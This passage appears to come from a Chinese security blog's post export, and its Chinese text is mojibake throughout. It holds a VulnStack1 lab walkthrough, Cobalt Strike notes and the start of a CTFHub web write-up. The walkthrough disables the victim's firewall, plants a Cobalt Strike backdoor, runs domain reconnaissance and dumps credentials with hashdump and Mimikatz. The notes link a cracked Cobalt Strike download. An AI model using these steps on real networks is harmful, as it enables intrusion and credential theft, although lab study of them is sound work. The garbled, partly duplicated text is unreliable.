Executable(S)`ï¼Œç›‘å¬å™¨é€‰æ‹©åˆšåˆ›å»ºçš„ `Listener`ï¼Œè¾“å‡ºé€‰æ‹©`Windows EXE`\n\n![](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200804165256799.png)\n\n**3.èšå‰‘ä¸Šä¼ åé—¨**\n\nå…ˆå…³é—­å—å®³æœºé˜²ç«å¢™\n\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n![](https://img.jwt1399.top//img/20200804170220.png)\n\nå†ä¸Šä¼ ç”Ÿæˆçš„exe\n\n![](https://img.jwt1399.top//img/20200804170222.png)\n\n**4.æ‰§è¡Œexeè·å¾—shell**\nç›´æ¥è¾“å…¥exe æ–‡ä»¶åæ‰§è¡Œ exe\n\n![](https://img.jwt1399.top//img/20200804170206.png)\n\nè·å¾—Cobalt Strike çš„ shell\n\n| ä¸»æœºä¸Šçº¿                                             | ä¸»æœºä¸Šçº¿                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200804170514.png) | ![](https://img.jwt1399.top//img/20200804171118.png) |\n\næ‹¿åˆ° `shell` ç¬¬ä¸€æ­¥ï¼Œè°ƒä½å¿ƒè·³å€¼ï¼Œé»˜è®¤å¿ƒè·³ä¸º `60s`ï¼Œæ‰§è¡Œå‘½ä»¤çš„å“åº”å¾ˆæ…¢ï¼Œè¿›å…¥ `beacon` æ‰§è¡Œ `sleep 5` æˆ–è€…å³é”®ä¸»æœºé€‰æ‹© `ä¼šè¯` â†’`Sleep`è¿›è¡Œè®¾ç½®\n\n![](https://img.jwt1399.top//img/20200804172330.png)\n\n### ä¸»æœºä¿¡æ¯æ”¶é›†\n\nå³é”®å—å®³æœºé€‰æ‹©`è¿›å…¥ beacon` æ‰§è¡Œå‘½ä»¤ï¼ˆæ‰§è¡Œcmdå‘½ä»¤å‰é¢è¦åŠ shellï¼‰\n\n**æŸ¥è¯¢åŸºæœ¬ä¿¡æ¯**\n\n```bash\nshell whoami\nshell hostname\nnet user \t# æœ¬æœºç”¨æˆ·åˆ—è¡¨\nnet localgroup administrators    # æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]\nshell systeminfo #æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯\nnslookup god.org    # è§£æåŸŸåIPåœ°å€\n```\n\n![](https://img.jwt1399.top//img/20200804173824.png)\n\n**æŸ¥è¯¢æ“ä½œç³»ç»Ÿä¿¡æ¯**\n\n```bash\nshell systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"  # è‹±æ–‡æ“ä½œç³»ç»Ÿ\nshell systeminfo | findstr /B /C:\"OS åç§°\" /C:\"OS ç‰ˆæœ¬\"   # ä¸­æ–‡æ“ä½œç³»ç»Ÿ\nshell echo %PROCESSOR_ARCHITECTURE%    # æŸ¥çœ‹ç³»ç»Ÿç³»ç»Ÿç»“æ„\n```\n\n**æŸ¥è¯¢å·²å®‰è£…çš„è½¯ä»¶ä»¥åŠç‰ˆæœ¬ä¿¡æ¯**\n\n```bash\n# ä½¿ç”¨wmicæ“ä½œ\nshell wmic product get name,version \n\n#ä½¿ç”¨powershellè¿›è¡Œæ“ä½œ\npowershell \"Get-WmiObject -class Win32_Product | Select-Object -Property name,Version\" \n```\n\n**æŸ¥è¯¢è¿›ç¨‹åŠæœåŠ¡**\n\n```bash\nshell tasklist # é»˜è®¤æ˜¾ç¤ºæ˜ åƒåç§°ï¼ŒPIDï¼Œä¼šè¯åï¼Œä¼šè¯ï¼Œå†…å­˜ä½¿ç”¨\nshell tasklist /svc # é»˜è®¤æ˜¾ç¤ºæ˜ åƒåç§°ï¼ŒPIDï¼ŒæœåŠ¡\nshell wmic process list brief # åˆ—å‡ºè¿›ç¨‹çš„æ ¸å¿ƒä¿¡æ¯,ç±»ä¼¼ä»»åŠ¡ç®¡ç†å™¨\nnet statistics workstation     # æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´\nnetstat -ano    #æŸ¥è¯¢ç«¯å£åˆ—è¡¨\nwmic qfe get caption,description,hotfixid,installedon   #æŸ¥è¯¢æœ¬æœºå®‰è£…çš„è¡¥ä¸\n```\n\n### åŸŸä¿¡æ¯æ”¶é›†\n\n#### åŸºç¡€å‘½ä»¤\n\n```bash\nshell ipconfig /all\t# æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰\nshell net user /domain    # æŸ¥è¯¢åŸŸç”¨æˆ·\nshell net view \t\t\t# æŸ¥çœ‹åŸŸä¿¡æ¯\nshell net view /domain   # æŸ¥çœ‹ä¸»åŸŸä¿¡æ¯\nshell net time /domain  # è·å–åŸŸæœåŠ¡å™¨çš„æ—¶é—´\nshell net group \"domain computers\" /domain         #æŸ¥çœ‹åŸŸå†…æ‰€æœ‰çš„ä¸»æœºå\nshell net group \"domain admins\"   /domain          #æŸ¥çœ‹åŸŸç®¡ç†å‘˜\nshell net group \"domain controllers\" /domain       #æŸ¥çœ‹åŸŸæ§\nshell net config workstation  # æŸ¥è¯¢å½“å‰ç™»é™†åŸŸåŠå½“å‰è®¡ç®—æœºåï¼Œå…¨åï¼Œç”¨æˆ·åï¼Œç³»ç»Ÿç‰ˆæœ¬ï¼Œå·¥ä½œç«™åŸŸ\n```\n\n#### åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸæ§\n\nä½¿ç”¨ `shell ipconfig /all` æŸ¥çœ‹ `DNS` æœåŠ¡å™¨ï¼Œå‘ç° DNS æœåŠ¡å™¨åä¸º `god.org`\n\n![](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200805161038207.png)\n\nä»åŸŸä¿¡æ¯æ”¶é›†å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š\n\n- åŸŸï¼šgod.org\n- åŸŸå†…æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼šadministratorã€ligangã€liukaifeng01\n- åŸŸå†…æœ‰ä¸‰å°ä¸»æœºï¼šDEV1(ä¸åœ¨æ­¤ç¯å¢ƒä¸­)ã€ROOT-TVI862UBEH(192.168.52.141)ã€STU1(192.168.52.143)\n- åŸŸæ§ï¼šOWA(192.168.52.138)\n- åŸŸç®¡ç†å‘˜ï¼šadministrator\n\n## æ¨ªå‘æ¢æµ‹\n\n#### å‡­æ®å¯¼å‡º\n\n> å‡­æ®å¯ä»¥ç†è§£ä¸ºç›®æ ‡æœºçš„è´¦å·ï¼Œå¯†ç ã€‚å‡­æ®å¯¼å‡ºæ˜¯æ¸—é€æµ‹è¯•ä¸­æä¸ºé‡è¦çš„æ­¥éª¤ï¼Œå¯¼å‡ºç›®æ ‡æœºå‡­æ®åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡­æ®å®ç°æ¨ªå‘ç§»åŠ¨ï¼ˆåˆ©ç”¨hashä¼ é€’ï¼Œsmb/rdpçˆ†ç ´ç­‰ç­‰æ‰‹æ³•ï¼‰æ¥æ‰©å¤§æˆ‘ä»¬çš„æˆ˜æœã€‚\n\n##### hashdumpè¯»å†…å­˜å¯†ç \n\n```bash\nbeacon> hashdump\næˆ–è€…\nå³é”®ç‚¹å‡»beaconä¼šè¯â†’æ‰§è¡Œâ†’è½¬å‚¨Hash\n```\n\n##### **Mimikatzå¯¼å‡ºå‡­æ®**\n\nåˆ©ç”¨ `mimitakz` æ¨¡å—ï¼ˆå®æˆ˜ä¸­éœ€è¦å…æ€å¤„ç†ï¼‰ï¼Œè¯»æ³¨å†Œè¡¨å¯†ç \n\n```bash\nbeacon> logonpasswords\næˆ–è€…\nå³é”®ç‚¹å‡»ä¸»æœºâ†’æ‰§è¡Œâ†’Run Mimikatz\n```\n\n![](https://img.jwt1399.top//img/20200804182058.png)\n\n##### **å‡­æ®å­˜å‚¨**\n\nç‚¹å‡»`å‡­è¯ä¿¡æ¯`å¯ä»¥æŸ¥çœ‹è¯»å–åˆ°çš„å¯†ç \n\n![](https://img.jwt1399.top//img/20200804182054.png)\n\n## ç¯å¢ƒå´©äº†ï¼Œåç»­æ“ä½œæš‚æ—¶æ— æ³•æ›´æ–°\n\n**å‚è€ƒï¼š**\n\n- [ATT&CKå®æˆ˜ | Vulnstack çº¢é˜Ÿï¼ˆä¸€ï¼‰](https://www.freebuf.com/column/231111.html)\n\n- [ATT&CK å®æˆ˜ - çº¢æ—¥å®‰å…¨ vulnstack (ä¸€)](https://soapffz.com/sec/558.html#menu_index_1)\n\n- [å†…ç½‘æ¸—é€é¶æœº-VulnStack 1](https://cloud.tencent.com/developer/article/1633420)\n- [ä»å¤–ç½‘åˆ°åŸŸæ§ï¼ˆvulnstacké¶æœºå®æˆ˜ï¼‰](https://www.anquanke.com/post/id/189940#h2-0)\n- [[å†…ç½‘æ¸—é€å®æˆ˜æŠ€å·§](https://www.iambigboss.top/post/54200_1_1.html)]([https://www.iambigboss.top/post/54200_1_1.html#%E6%B4%BE%E7%94%9FCobaltStrike%E6%9D%83%E9%99%90](https://www.iambigboss.top/post/54200_1_1.html#æ´¾ç”ŸCobaltStrikeæƒé™))\n- [å†…ç½‘æ¸—é€å­¦ä¹ å¯¼èˆª](https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw)\n- [å†…ç½‘æ¸—é€å‘½ä»¤å¤§å…¨](https://www.t00ls.net/articles-39285.html)\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["é¶åœº","VulnStack","å†…ç½‘æ¸—é€"],"categories":["Web"]},{"title":"Cobalt Strike å­¦ä¹ è®°å½•","url":"/posts/24047.html","content":"\nCobalt Strikeï¼ˆç®€ç§°â€œCSâ€ï¼‰æ˜¯ä¸€æ¬¾å›¢é˜Ÿä½œæˆ˜æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œåˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œä¸€ä¸ªæœåŠ¡ç«¯å¯ä»¥å¯¹åº”å¤šä¸ªå®¢æˆ·ç«¯ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯å¯ä»¥è¿æ¥å¤šä¸ªæœåŠ¡ç«¯ï¼Œé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œexeã€powershellæœ¨é©¬ç”Ÿæˆç­‰ã€‚ä¸»è¦ç”¨æ¥åæœŸæŒä¹…æ¸—é€ã€æ¨ªå‘ç§»åŠ¨ã€æµé‡éšè—ã€æ•°æ®çªƒå–çš„å·¥å…·ã€‚\n\n## å®‰è£…\n\nCobalt Strike åˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ã€‚æœåŠ¡ç«¯åªèƒ½è¿è¡Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯æ­å»ºåœ¨VPSä¸Šï¼›å®¢æˆ·ç«¯åœ¨Windowsã€Linuxã€Macä¸‹éƒ½å¯ä»¥è¿è¡Œ (éœ€è¦é…ç½®å¥½Javaç¯å¢ƒ)ã€‚\n\nCobalt Strike 4 ç ´è§£ç‰ˆä¸‹è½½åœ°å€ï¼š[CobaltStrike.zip](https://jwt1399.lanzoui.com/iTvBaf82p1g)\n\n### æ–‡ä»¶ç»“æ„\n\n```bash\n$:/CobaltStrike4# tree\n.\nâ”œâ”€â”€ agscript\nâ”œâ”€â”€ c2lint\nâ”œâ”€â”€ Cobalt Strike 4.exe\nâ”œâ”€â”€ cobaltstrike.auth\nâ”œâ”€â”€ CobaltstrikeCN.jar\t# æ±‰åŒ–åŒ…\nâ”œâ”€â”€ cobaltstrike.jar\t# å®¢æˆ·ç«¯ç¨‹åº\nâ”œâ”€â”€ cobaltstrike.store\nâ”œâ”€â”€ icon.ico\nâ”œâ”€â”€ icon.jpg\nâ”œâ”€â”€ peclone\nâ”œâ”€â”€ start.bat\nâ”œâ”€â”€ start.sh\nâ”œâ”€â”€ teamserver\t# æœåŠ¡ç«¯ç¨‹åº\nâ”œâ”€â”€ teamserver.bat\nâ””â”€â”€ third-party\t# ç¬¬ä¸‰æ–¹å·¥å…·\n    â”œâ”€â”€ README.winvnc.txt\n    â”œâ”€â”€ winvnc.x64.dll\n    â””â”€â”€ winvnc.x86.dll\n\n1 directory, 17 files\n```\n\n### æœåŠ¡ç«¯å®‰è£…\n\nä¸‹è½½å¥½**CobaltStrike.zip**è§£å‹ï¼Œå°†æ–‡ä»¶å¤¹æ”¾å…¥Linuxæœºå™¨ä¸­ï¼ˆæˆ‘æ”¾åœ¨äº† `opt` ç›®å½•ä¸‹ï¼‰ï¼Œç„¶åè¿è¡Œï¼š\n\n```bash\ncd /opt/CobaltStrike4\n\nchmod +x teamserver\n\nsudo ./teamserver <host> <password>   \n\n\n# hostï¼šæœåŠ¡å™¨å¤–ç½‘IP\n# passwordï¼šå®¢æˆ·ç«¯è¿æ¥éœ€è¦çš„å¯†ç \n```\n\n![æœåŠ¡ç«¯æ“ä½œ](https://img.jwt1399.top//img/20200802155722.png)\n\n### å®¢æˆ·ç«¯å®‰è£…\n\nå°†ä¸Šé¢åŒæ ·çš„æ–‡ä»¶å¤¹åœ¨Windowsä¸Šé¢æ”¾ä¸€ä»½ï¼ŒåŒå‡»è¿è¡Œæ–‡ä»¶å¤¹ä¸­çš„ `Cobalt Strike 4.exe` ï¼Œè¿™ä¸ªexeæ˜¯æˆ‘è‡ªå·±åˆ¶ä½œçš„å¯åŠ¨å™¨ï¼Œå¦‚æœä½ ä¸‹è½½çš„å…¶ä»–å®‰è£…åŒ…ï¼Œä½ å¯ä»¥ç‚¹å‡»æ–‡ä»¶å¤¹ä¸­çš„ `start.bat` è¿›è¡Œå¯åŠ¨ã€‚\n\n![å®¢æˆ·ç«¯è¿æ¥](https://img.jwt1399.top//img/20200802155728.png)\n\n å¦‚æœè¿™æ˜¯æ‚¨ä¸æ­¤å›¢é˜ŸæœåŠ¡å™¨çš„ç¬¬ä¸€æ¬¡è¿æ¥ï¼ŒCobalt Strikeå°†è¯¢é—®æ‚¨æ˜¯å¦è¯†åˆ«æ­¤å›¢é˜ŸæœåŠ¡å™¨çš„SHA256å“ˆå¸Œå€¼ã€‚å¦‚æœæ‚¨è¿™æ ·åšï¼Œè¯·æŒ‰OKï¼ŒCobalt Strikeå®¢æˆ·ç«¯å°†è¿æ¥åˆ°æœåŠ¡å™¨ã€‚Cobalt Strikeè¿˜ä¼šè®°ä½è¿™ä¸ªSHA256å“ˆå¸Œï¼Œä»¥ä¾¿å°†æ¥è¿æ¥ã€‚æ‚¨å¯ä»¥é€šè¿‡Cobalt Strike â€“ >Preferences â€“ > Fingerprintsç®¡ç†è¿™äº›å“ˆå¸Œå€¼ã€‚\n\n![](https://img.jwt1399.top//img/20200802155730.png)\n\n![ç™»å½•æˆåŠŸç•Œé¢](https://img.jwt1399.top//img/20200802155734.png)\n\n### æ‰©å±•çŸ¥è¯†ï¼šå¯åŠ¨å™¨åˆ¶ä½œ\n\næ¯æ¬¡å¯åŠ¨`Cobalt Strike`éƒ½å¾—é€šè¿‡`start.bat` è¿›è¡Œå¯åŠ¨ï¼Œä½†æ˜¯è¿½æ±‚å®Œç¾çš„ç®€ç®€æ˜¯å¿å—ä¸äº†çš„ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ¥åˆ¶ä½œä¸€ä¸ª`exe`å¯åŠ¨å™¨\n\n**ä¿®æ”¹å‰åå¯¹æ¯”ï¼š**\n\n| ä¿®æ”¹å‰                                               | ä¿®æ”¹å                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200802164722.png) | ![](https://img.jwt1399.top//img/20200802164725.png) |\n\nåˆ¶ä½œéœ€è¦ç”¨åˆ° **Bat_To_Exe_Converter** è¿™ä¸ªå·¥å…·ã€‚ä¸‹è½½åœ°å€ï¼š[Bat_To_Exe_Converter.zip](https://jwt1399.lanzoui.com/iCpJUf85wdi)\n\n1.é€‰æ‹©æ–°å»ºæˆ–è€…ç›´æ¥æ‰“å¼€start.batï¼Œä¸»è¦æ˜¯å°†å¯åŠ¨çš„ä»£ç å¯¼å…¥\n\n![](https://img.jwt1399.top//img/20200802170438.png)\n\n2.åœ¨å³ä¾§è®¾ç½®å›¾æ ‡(icoæ ¼å¼)ï¼Œå¯†ç ï¼ŒEXEæ ¼å¼ç­‰å±æ€§ã€‚è¿™é‡Œæˆ‘æ·»åŠ äº†å›¾æ ‡å¹¶æŠŠEXEæ ¼å¼è®¾ç½®ä¸º64ä½éšå½¢\n\n![](https://img.jwt1399.top//img/20200802170548.png)\n\n**EXEæ ¼å¼**æ§åˆ¶windowsçš„é»‘çª—å£æ˜¯å¦å¼¹å‡ºï¼Œéšå½¢ä¸ºä¸å¼¹å‡ºï¼Œå¯è§ä¸ºå¼¹å‡ºï¼›æ‰“åŒ…å‹ç¼©ï¼Œä¼šå¯¹æˆ‘ä»¬ç”Ÿæˆçš„exeè¿›è¡Œå‹ç¼©ã€‚\n\n![](https://img.jwt1399.top//img/20200802170535.png)\n\nè¿˜å¯ä»¥è®¾ç½®ç‰ˆæœ¬ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰è®¾ç½®\n\n![](https://img.jwt1399.top//img/20200802170532.png)\n\n3.è®¾ç½®å¥½åï¼Œç‚¹å‡»è½¬æ¢æŒ‰é’®ï¼Œé€‰æ‹©å­˜æ”¾çš„ç›®å½•å°±å¯ä»¥å•¦\n\n![](https://img.jwt1399.top//img/20200802170521.png)\n\n## å¿«æ·å·¥å…·æ¡\n\n![](https://img.jwt1399.top//img/20200804182433.png)\n\n## Listenerså’ŒPayload\n\n**1.CSåˆ›å»ºListener**\n\n> Listner(ç›‘å¬å™¨)ï¼šä¸“é—¨ç”¨äºå¯¹å…¶ä»–å¯¹è±¡èº«ä¸Šå‘ç”Ÿçš„äº‹ä»¶æˆ–çŠ¶æ€æ”¹å˜è¿›è¡Œç›‘å¬å’Œç›¸åº”å¤„ç†çš„å¯¹è±¡ï¼Œå½“è¢«ç›‘è§†çš„å¯¹è±¡å‘ç”Ÿæƒ…å†µæ—¶ï¼Œç«‹å³é‡‡å–ç›¸åº”çš„è¡ŒåŠ¨ã€‚\n\né€‰æ‹© `Cobalt Stike` â†’ `Listeners` â†’ `Add` åˆ›å»ºä¸€ä¸ªç›‘å¬å™¨\n\n![](https://img.jwt1399.top//img/20200804163614.png)\n\n**2.ç”ŸæˆPayloadæ–‡ä»¶**\n\n> Payloadåœ¨æ¸—é€æµ‹è¯•ä¹‹ä¸­å¤§å®¶å¯ä»¥ç®€å•åœ°ç†è§£ä¸ºä¸€æ®µæ¼æ´åˆ©ç”¨/æ¤å…¥åé—¨çš„ä»£ç æˆ–ç¨‹åºã€‚\n\né€‰æ‹©`æ”»å‡»` -> `ç”Ÿæˆåé—¨` -> `Windows Executable(S)`ï¼Œç›‘å¬å™¨é€‰æ‹©åˆšåˆ›å»ºçš„ `Listener`ï¼Œè¾“å‡ºé€‰æ‹©`Windows EXE`\n\n![](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200804165256799.png)\n\n**3.èšå‰‘ä¸Šä¼ åé—¨**\n\nå…ˆå…³é—­å—å®³æœºé˜²ç«å¢™\n\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n![](https://img.jwt1399.top//img/20200804170220.png)\n\nå†ä¸Šä¼ ç”Ÿæˆçš„exe\n\n![](https://img.jwt1399.top//img/20200804170222.png)\n\n**4.æ‰§è¡Œexeè·å¾—shell**\nç›´æ¥è¾“å…¥exe æ–‡ä»¶åæ‰§è¡Œ exe\n\n![](https://img.jwt1399.top//img/20200804170206.png)\n\nè·å¾—Cobalt Strike çš„ shell\n\n| ä¸»æœºä¸Šçº¿                                             | ä¸»æœºä¸Šçº¿                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200804170514.png) | ![](https://img.jwt1399.top//img/20200804171118.png) |\n\næ‹¿åˆ° `shell` ç¬¬ä¸€æ­¥ï¼Œè°ƒä½å¿ƒè·³å€¼ï¼Œé»˜è®¤å¿ƒè·³ä¸º `60s`ï¼Œæ‰§è¡Œå‘½ä»¤çš„å“åº”å¾ˆæ…¢ï¼Œè¿›å…¥ `beacon` æ‰§è¡Œ `sleep 5` æˆ–è€…å³é”®ä¸»æœºé€‰æ‹© `ä¼šè¯` â†’`Sleep`è¿›è¡Œè®¾ç½®\n\n![](https://img.jwt1399.top//img/20200804172330.png)\n\n**å‚è€ƒï¼š**\n\n- https://www.cnblogs.com/ichunqiu/p/11934077.html\n\n## beaconåŸºæœ¬å‘½ä»¤\n\n![åŸºæœ¬å‘½ä»¤](https://img.jwt1399.top//img/20200804182137.png)\n\n## ä¸Metasploitè”åŠ¨\n\nå¾…æ›´ã€‚ã€‚ã€‚\n\n## æ–‡ä»¶/è¿›ç¨‹ç®¡ç†\n\n [æ–‡ä»¶/è¿›ç¨‹ç®¡ç†ä¸é”®ç›˜è®°å½•](https://www.cnblogs.com/ichunqiu/p/12034201.html)\n\n## å®‰è£…æ‰©å±•\n\né€‰æ‹©èœå•æ çš„`Cobalt Strike`-->`è„šæœ¬ç®¡ç†å™¨`ï¼Œç‚¹å‡»`load`ï¼Œç„¶åé€‰æ‹©  `cna` æ‰©å±•æ–‡ä»¶å³å¯ï¼Œæ—è¾¹çš„unloadä¸ºå»é™¤è¯¥æ‰©å±•ï¼Œreloadä¸ºé‡æ–°åŠ è½½è¯¥æ‰©å±•ã€‚\n\n### elevate.cna\n\nè„šæœ¬åŠŸèƒ½ï¼šå¢åŠ äº”ç§ææƒæ–¹å¼\nè„šæœ¬ä½ç½®ï¼šåœ¨Elevateä¸­\nåœ°å€ï¼š https://github.com/rsmudge/ElevateKit\n\n### ProcessTree.cna\n\nè„šæœ¬åŠŸèƒ½ï¼šè®©pså‘½ä»¤å¯ä»¥æ˜¾ç¤ºçˆ¶å­å…³ç³»å¹¶æ˜¾ç¤ºé¢œè‰²\nè„šæœ¬ä½ç½®ï¼šå‘½ä»¤è¡Œä¸­\nåœ°å€ï¼š https://github.com/ars3n11/Aggressor-Scripts\n\n\n\nå‚è€ƒï¼š[ä½¿ç”¨Aggressorè„šæœ¬é›•é¥°Cobalt Strike](https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg)\n\n## ä¸­æ–‡ç”¨æˆ·æ‰‹å†Œ\n\nCobaltStrike4.0ç”¨æˆ·æ‰‹å†Œ_ä¸­æ–‡ç¿»è¯‘ï¼š[è“å¥äº‘](https://jwt1399.lanzoui.com/iuF2Efajjoh)\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Cobalt Strike"],"categories":["Tools"]},{"title":"CTFHub-æŠ€èƒ½æ ‘-Web","url":"/posts/60046.html","content":"\næœ€è¿‘ä¸€æ®µæ—¶é—´ä¸€ç›´åœ¨å¤ä¹ WebåŸºç¡€çŸ¥è¯†ï¼Œå…‰çœ‹ç”Ÿç¡¬çš„çŸ¥è¯†ç‚¹ä¹Ÿæ— è¶£ï¼Œå°±æƒ³ç€è¾¹åˆ·é¢˜è¾¹å¤ä¹ å§ï¼Œæ­£å¥½çœ‹åˆ°ç¾¤é‡Œåœ¨æ¨èCTFHubè¿™ä¸ªå¹³å°ï¼Œäºæ˜¯æˆ‘å°±å¼€å§‹åˆ·[CTFHubæŠ€èƒ½æ ‘](https://www.ctfhub.com/#/skilltree )å•¦ğŸˆ\n\n## Webå‰ç½®æŠ€èƒ½\n\n### HTTPåè®®\n\n> HTTPæ˜¯Hyper Text Transfer Protocolï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰çš„ç¼©å†™,æ˜¯ç”¨äºä»ä¸‡ç»´ç½‘ï¼ˆWWW:World Wide Web ï¼‰æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ é€åè®®ã€‚HTTPæ˜¯ä¸€ä¸ªåŸºäºTCP/IPé€šä¿¡åè®®æ¥ä¼ é€’æ•°æ®ï¼ˆHTML æ–‡ä»¶, å›¾ç‰‡æ–‡ä»¶, æŸ¥è¯¢ç»“æœç­‰ï¼‰ã€‚     æ›´å¤šè¯¦ç»†è¯·çœ‹ï¼š[HTTPæ•™ç¨‹](https://www.runoob.com/http/http-tutorial.html)\n\n**HTTPä¸‰ä¸ªç‰¹å¾ï¼š**æ— è¿æ¥ã€åª’ä½“ç‹¬ç«‹ã€æ— çŠ¶æ€\n\n**HTTPä¹ç§è¯·æ±‚æ–¹æ³•ï¼š**GETã€POST ã€HEADã€OPTIONSã€PUTã€PATCHã€DELETEã€TRACEã€CONNECT \n\n**å®¢æˆ·ç«¯HTTPè¯·æ±‚æ¶ˆæ¯**:ç”±`è¯·æ±‚è¡Œ`ã€`è¯·æ±‚å¤´éƒ¨`ã€`è¯·æ±‚æ•°æ®`ç»„æˆã€‚\n\n| ä¸€èˆ¬æ ¼å¼                                                     | ç¤ºä¾‹                                                 |\n| ------------------------------------------------------------ | ---------------------------------------------------- |\n| ![](https://www.runoob.com/wp-content/uploads/2013/11/2012072810301161.png) | ![](https://img.jwt1399.top//img/20200717091709.png) |\n\n**æœåŠ¡å™¨HTTPå“åº”æ¶ˆæ¯**:ç”±`çŠ¶æ€è¡Œ`ã€`æ¶ˆæ¯æŠ¥å¤´`å’Œ`å“åº”æ­£æ–‡`ç»„æˆã€‚\n\n![](https://img.jwt1399.top//img/20200717091703.png)\n\n**HTTPçŠ¶æ€ç åˆ†ç±»**\n\n| åˆ†ç±» | åˆ†ç±»æè¿°                                       |\n| :--- | :--------------------------------------------- |\n| 1**  | ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ   |\n| 2**  | æˆåŠŸï¼Œæ“ä½œè¢«æˆåŠŸæ¥æ”¶å¹¶å¤„ç†                     |\n| 3**  | é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚             |\n| 4**  | å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚     |\n| 5**  | æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯ |\n\nçŠ¶æ€ç è¯¦æƒ…è¯·çœ‹:https://www.runoob.com/http/http-status-codes.html)\n\n#### è¯·æ±‚æ–¹å¼\n\n **é¢˜ç›®è€ƒç‚¹ï¼šHTTP Method**\n\næ‰“å¼€é“¾æ¥æ˜¯ä¸€æ®µè¯\n\n```\nHTTP Method is GET\nUse CTF**B Method,I will give you flag.\nHint If you got [HTTP Method Not Allowed] Error,you should requests index.php\n```\n\næ ¹æ®é¢˜ç›®æ„æ€ï¼Œéœ€è¦ä½ ç”¨CTF**B æ–¹æ³•è¯·æ±‚ index.phpæ¥è·å–flag\n\næ³¨æ„ï¼šHTTP Method æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œå¹¶ä¸”åŒºåˆ†å¤§å°å†™.\n\n**æ–¹æ³•ä¸€ï¼šä½¿ç”¨curl**\n\n```\ncurl -v -X CTFHUB http://challenge-53da4bfe747dae4b.sandbox.ctfhub.com:10080/index.php\n```\n\ncurlç”¨æ³•è¯·å‚è€ƒï¼šhttps://jwt1399.top/posts/49445.html#toc-heading-46\n\n**æ–¹æ³•äºŒï¼šä½¿ç”¨BurpæŠ“åŒ…ä¿®æ”¹è¯·æ±‚æ–¹å¼åï¼Œå†å‘åŒ…**\n\n![](https://img.jwt1399.top//img/20200717094841.png)\n\n#### 